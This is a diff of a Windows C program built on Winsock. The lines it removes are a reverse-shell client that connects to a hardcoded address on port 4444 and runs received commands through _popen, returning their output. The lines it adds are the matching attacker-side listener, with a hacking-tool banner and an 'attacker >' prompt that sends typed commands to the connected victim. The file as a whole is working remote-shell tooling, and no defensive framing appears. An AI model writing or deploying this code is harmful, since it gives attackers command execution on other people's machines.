@@ -2,9 +2,18 @@
 #include <stdlib.h>
 #include <string.h>
 #include <winsock2.h>
-#include <windows.h>
 
 #define MAX_COMMAND_LENGTH 1024
+
+// Banner Function
+void print_banner() {
+    printf(" _                               _    \n");
+    printf(" _ __ ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __\n");
+    printf("| '_ ` _ \\ / _ \\ __/ _ \\ '__/ __| '__/ _` |/ __| |/ /\n");
+    printf("| | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   < \n");
+    printf("|_| |_| |_|\\___|\\__\\___|_|  \\___|_|  \\__,_|\\___|_\\_\\\n");
+    printf("\n");
+}
 
 // Function to initialize Winsock
 void init_winsock() {
@@ -15,86 +24,117 @@ void init_winsock() {
     }
 }
 
-// Clean up Winsock
+// Function to clean up Winsock
 void cleanup_winsock() {
     WSACleanup();
 }
 
-// Function to execute a command and send the output back to the server
-void execute_command(SOCKET server_socket, char *command) {
+// Function to start the listener
+void listener(const char *LHOST, int LPORT) {
+    SOCKET server_socket, client_socket;
+    struct sockaddr_in server_addr, client_addr;
     char buffer[MAX_COMMAND_LENGTH];
-    FILE *fp;
-
-    // Open a pipe to execute the command
-    fp = _popen(command, "r");
-    if (fp == NULL) {
-        strcpy(buffer, "Failed to execute command\n");
-        send(server_socket, buffer, strlen(buffer), 0);
-        return;
-    }
-
-    // Read the command's output and send it to the server
-    while (fgets(buffer, MAX_COMMAND_LENGTH, fp) != NULL) {
-        send(server_socket, buffer, strlen(buffer), 0);
-    }
-
-    _pclose(fp);
-}
-
-int main() {
-    SOCKET client_socket;
-    struct sockaddr_in server_addr;
-    char buffer[MAX_COMMAND_LENGTH];
+    int addr_size = sizeof(client_addr);
     int bytes_received;
 
-    // Hardcoded server IP and port
-    const char *server_ip = "10.0.1.35";
-    const int server_port = 4444;
-
-    // Initialize Winsock
-    init_winsock();
-
-    // Create a socket
-    client_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (client_socket == INVALID_SOCKET) {
+    // Create server socket
+    server_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_socket == INVALID_SOCKET) {
         printf("Socket creation failed with error: %d\n", WSAGetLastError());
         cleanup_winsock();
         exit(1);
     }
 
-    // Set up the server address structure
+    // Set up server address
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(server_port);
-    server_addr.sin_addr.s_addr = inet_addr(server_ip);
+    server_addr.sin_port = htons(LPORT);
+    server_addr.sin_addr.s_addr = inet_addr(LHOST);
 
-    // Connect to the server
-    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        printf("Connection to server failed with error: %d\n", WSAGetLastError());
-        closesocket(client_socket);
+    // Bind socket to the IP and port
+    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        printf("Bind failed with error: %d\n", WSAGetLastError());
         cleanup_winsock();
         exit(1);
     }
 
-    printf("Connected to server %s:%d\n", server_ip, server_port);
+    // Listen for incoming connections
+    if (listen(server_socket, 1) == SOCKET_ERROR) {
+        printf("Listen failed with error: %d\n", WSAGetLastError());
+        cleanup_winsock();
+        exit(1);
+    }
 
-    // Main loop to receive and execute commands from the server
+    printf("Listening on %s:%d...\n", LHOST, LPORT);
+
+    // Accept client connection
+    client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
+    if (client_socket == INVALID_SOCKET) {
+        printf("Accept failed with error: %d\n", WSAGetLastError());
+        cleanup_winsock();
+        exit(1);
+    }
+
+    printf("Client connected\n");
+
+    // Command loop
     while (1) {
-        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH - 1, 0);
-        if (bytes_received <= 0) {
-            printf("Connection closed or error occurred\n");
+        // Prompt for input
+        printf("attacker > ");
+        if (fgets(buffer, MAX_COMMAND_LENGTH, stdin) == NULL) {
+            printf("Error reading input. Exiting...\n");
             break;
         }
 
-        buffer[bytes_received] = '\0'; // Null-terminate the received data
-        printf("Received command: %s", buffer);
+        // Remove trailing newline character from input
+        buffer[strcspn(buffer, "\n")] = '\0';
 
-        // Execute the command and send the output back to the server
-        execute_command(client_socket, buffer);
+        // Exit condition
+        if (strncmp(buffer, "exit", 4) == 0) {
+            printf("Exiting listener...\n");
+            break;
+        }
+
+        // Send command to client
+        if (send(client_socket, buffer, strlen(buffer), 0) == SOCKET_ERROR) {
+            printf("Failed to send command. Connection may be closed.\n");
+            break;
+        }
+
+        // Receive response from client
+        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH - 1, 0);
+        if (bytes_received <= 0) {
+            printf("Client disconnected or error occurred.\n");
+            break;
+        }
+
+        buffer[bytes_received] = '\0'; // Null-terminate response
+        printf("%s", buffer);          // Print client response
     }
 
-    // Clean up
+    // Close sockets
     closesocket(client_socket);
+    closesocket(server_socket);
     cleanup_winsock();
+}
+
+int main() {
+    char LHOST[16];
+    int LPORT;
+
+    // Print banner
+    print_banner();
+
+    // Get LHOST and LPORT from user
+    printf("Enter LHOST (IP address): ");
+    scanf("%15s", LHOST);
+    printf("Enter LPORT (Port number): ");
+    scanf("%d", &LPORT);
+
+    // Initialize Winsock
+    init_winsock();
+
+    // Start the listener
+    listener(LHOST, LPORT);
 
     return 0;
 }
